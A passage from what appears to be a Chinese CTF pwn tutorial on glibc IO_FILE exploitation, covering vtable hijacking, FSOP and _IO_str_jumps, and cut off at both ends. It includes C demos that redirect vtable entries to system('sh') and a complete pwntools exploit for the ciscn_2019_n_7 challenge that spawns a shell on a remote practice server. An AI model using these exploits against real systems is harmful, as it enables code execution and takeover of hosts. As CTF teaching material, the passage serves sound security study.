*vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=<span class="number">0x41414141</span> <span class="comment">//xsputn</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;call 0x41414141&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据 vtable 在 _IO_FILE_plus 的偏移得到 vtable 的地址，在 64 位系统下偏移是 0xd8。之后搞清楚劫持的 IO 函数会调用 vtable 中的哪个虚函数。vtable 函数进行调用时，传入的第一个参数其实是对应的 _IO_FILE_plus 地址。比如调用 printf ，传递给 vtable 的第一个参数是 _IO_2_1_stdout_ 的地址。利用这点可以实现给劫持的 vtable 函数传參，比如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    memcopy(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=system_ptr <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在目前 <strong>libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的</strong>。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们首先分配一款内存来存放<strong>伪造的 vtable，之后修改 _IO_FILE_plus 的 vtable 指针指向这块内存</strong>。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 “/bin/sh” 或 “sh”。</p><p><strong>因为 vtable 中的函数调用时会把对应的 _IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入 _IO_FILE_plus 头部</strong>。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)。</p><p>同样，如果程序中不存在 fopen 等函数创建的 _IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的 _IO_FILE ，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print &amp;_IO_2_1_stdin_</span><br><span class="line">$2 &#x3D; (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line"></span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br></pre></td></tr></table></figure><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><ul><li>vtable 劫持分为两种：<ul><li>直接改写 vtable 中的虚函数指针</li><li>覆盖 vtable 的指针（伪造 vtabel）</li></ul></li><li>libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入</li><li>vtable 中的函数调用时会把对应的 _IO_FILE_plus 指针作为第一个参数传递，可以将 sh 或其他参数写入 _IO_FILE_plus 头部</li></ul><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018 HCTF the_end"></a>2018 HCTF the_end</h4><blockquote><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/">题目链接</a></p><p>通过伪造 vtabel 实现运行特定函数（修改虚函数的 overflow 指针）</p><p>其他做法：<a href="https://blog.csdn.net/Mira_Hu/article/details/103736917">https://blog.csdn.net/Mira_Hu/article/details/103736917</a></p></blockquote><h5 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h5><p>除了 canary 保护全开，任意地址写 5 字节</p><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>在程序调用 exit 后，会遍历 _IO_list_all ，调用 <em>IO_2_1_stdout</em> 下的 vatable 中 _setbuf 函数。先修改两个字节在当前 vtable 附近伪造一个 fake_vtable ，然后使用 3 个字节修改 fake_vtable 中 _setbuf 的内容为 one_gadget 。</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>进程内所有的 _IO_FILE 结构会使用 _chain 域相互连接形成一个链表，这个链表的头部由 _IO_list_all 维护。</p><p>FSOP 的核心思想就是劫持 _IO_list_all 的值来伪造链表和其中的 _IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用 _IO_flush_all_lockp，这个函数会刷新 _IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用 _IO_FILE_plus.vtable 中的 _IO_overflow。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210172118.jpeg" alt="img"></p><p>而 _IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p><ol><li><p>当 libc 执行 abort 流程时</p></li><li><p>当执行 exit 函数时</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210172159.png" alt="image-20201208195441734"></p></li><li><p>当执行流从 main 函数返回时</p></li></ol><h3 id="原理示例-1"><a href="#原理示例-1" class="headerlink" title="原理示例"></a>原理示例</h3><p>FSOP 利用的条件：泄露 libc.so 基址，因为 _IO_list_all 是作为全局变量储存在 libc.so 中的；用任意地址写把 _IO_list_all 改为指向可控内存的地址；伪造 _IO_FILE_plus 结构体。伪造结构体需要 bypass 这些 check ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>也就是</p><ul><li><strong>fp-&gt;_mode &lt;= 0</strong></li><li><strong>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</strong></li></ul><p>写一个 demo 验证一下：首先分配一块内存用于存放伪造 _IO_FILE_plus（_IO_FILE、vtable)。_IO_write_ptr、_IO_write_base、_mode 等数据偏移如下（可以通过查前面给出结构体算出来）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *list_all_ptr;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="comment">//bypass</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+vtable_offset)=((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">//vtable _IO_overflow</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=<span class="number">0x41414141</span>;</span><br><span class="line"><span class="comment">//orw _IO_list_all _chain 2 fake _IO_FILE_plus</span></span><br><span class="line">    list_all_ptr=(<span class="keyword">long</span> <span class="keyword">long</span> *)_IO_list_all;</span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前 0x100 个字节作为 _IO_FILE ，后 0x100 个字节作为 vtable ，在 vtable _IO_overflow 指针劫持为 0x41414141 。</p><p>之后，覆盖 libc 中的全局变量 _IO_list_all 指向伪造的 _IO_FILE_plus 。</p><blockquote><p>全局变量 _IO_list_all 存储着结构体 _IO_FILE_plus 的地址，这个地址也是 _IO_FILE 所在地址，后面是 vtable </p></blockquote><p>通过调用 exit 函数，程序会执行 _IO_flush_all_lockp，经过 fflush[^1] 获取 _IO_list_all 的值并取出作为 _IO_FILE_plus <strong>调用其中的 _IO_overflow 函数</strong>实现功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---&gt; call _IO_overflow</span><br><span class="line">[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock&#x3D;0x0)</span><br><span class="line">[#1] 0x7ffff7a8932a → Name: _IO_cleanup()</span><br><span class="line">[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status&#x3D;0x0, listp&#x3D;&lt;optimized out&gt;, run_list_atexit&#x3D;0x1)</span><br><span class="line">[#3] 0x7ffff7a47045 → Name: __GI_exit(status&#x3D;&lt;optimized out&gt;)</span><br><span class="line">[#4] 0x4005ce → Name: main()</span><br></pre></td></tr></table></figure><h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><h4 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h4><blockquote><p>大体是用 FSOP 思路，不是劫持 _IO_list_all _chain 指针伪造一个结构体；而直接修改 _IO_FILE_plus </p></blockquote><h4 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h4><p>保护全开，用的是 buu 的远程环境对应是 Ubuntu 16 libc 2.23：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enable</span><br></pre></td></tr></table></figure><p>程序只能有一个堆，用结构体维护，结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  size;<span class="comment">//8bit</span></span><br><span class="line">  data;<span class="comment">//8bit</span></span><br><span class="line">  chunk_addr;<span class="comment">//8bit  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>在 add 时写入 author 时溢出 8 bit 刚好可以覆盖堆指针：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210201615.png" alt="image-20201210201615356"></p><p>结合 edit 可以多次修改堆指针，实现任意地址多次写入：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210201739.png" alt="image-20201210201739661"></p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>myexit 函数有关闭 stdout、stderr 后执行 exit() ，exit() 时系统会调用 _IO_flush_all_lockp 。修改堆指针到 _IO_2_1_stderr_ ，布置绕过绕过需要的数据；在适当位置写入 system ，将 vtable 劫持到这个空间上，完成劫持 _IO_flush_all_lockp 为 system 。写入 _IO_2_1_stderr_ 时将 /bin/sh 写到 _IO_FILE 的头部，调用虚函数时 _IO_FILE 是第一个参数。</p><blockquote><p>因为 vtable 中的函数调用时会把对应的 _IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入 _IO_FILE_plus 头部。</p></blockquote><p><strong>调试查看结构体</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *((struct [结构体类型]*)[地址])</span><br></pre></td></tr></table></figure><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)<span class="comment">#,terminal=[&#x27;tmux&#x27;,&#x27;sp&#x27;,&#x27;-h&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_n_7&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28957</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_n_7&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;-&gt; \n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">name, content</span>):</span></span><br><span class="line">    command(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;New Author name:\n&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;New contents:\n&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">command(<span class="number">666</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># IO_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line"><span class="comment"># log.info(&quot;IO_list_all:&quot;+hex(IO_list_all))</span></span><br><span class="line">IO_2_1_stderr=libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]+libc_base</span><br><span class="line">log.info(<span class="string">&quot;IO_2_1_stderr:&quot;</span>+<span class="built_in">hex</span>(IO_2_1_stderr))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xf8</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(IO_2_1_stderr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0xb02)&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define writebase_offset 0x20   -&gt;0</span></span><br><span class="line"><span class="comment">#define writeptr_offset 0x28    -&gt;1</span></span><br><span class="line"><span class="comment">#define mode_offset 0xc0        -&gt;0</span></span><br><span class="line"><span class="comment">#define vtable_offset 0xd8      -&gt;system&amp;onegadget</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(system)*<span class="number">4</span><span class="comment">#p64(libc_base+0x4526a)*4#0x50-0x70</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(IO_2_1_stderr+<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="string">&#x27;a\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">command(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="glibc-2-24-利用"><a href="#glibc-2-24-利用" class="headerlink" title="glibc 2.24 利用"></a>glibc 2.24 利用</h2><h3 id="新增防御机制"><a href="#新增防御机制" class="headerlink" title="新增防御机制"></a>新增防御机制</h3><p>glibc 2.24 后新增 vtable 检查函数：IO_validate_vtable 和 _IO_vtable_check 。</p><blockquote><p>libio/libioP.h</p><p>libio/vtables.c</p></blockquote><p>vtables 被放进了专用的只读的 <code>__libc_IO_vtables</code> 段，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用 _IO_vtable_check 。</p><p>很多对 vtable 的攻击方式不再适用，思路转向 stream_buffer </p><h3 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h3><p>libc 中不仅仅只有 _IO_file_jumps 一个 vtable ，还有一个叫 _IO_str_jumps 的 ，这个 vtable 不在 check 范围之内。</p><p>比如 <code>_IO_str_jumps</code>（该符号在strip后会丢失）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/strops.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0)</span></span><br></pre></td></tr></table></figure><p><code>_IO_str_jumps</code> 中包含了一个叫做 <code>_IO_str_overflow</code> 的函数，该函数中存在相对地址的引用（可伪造）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 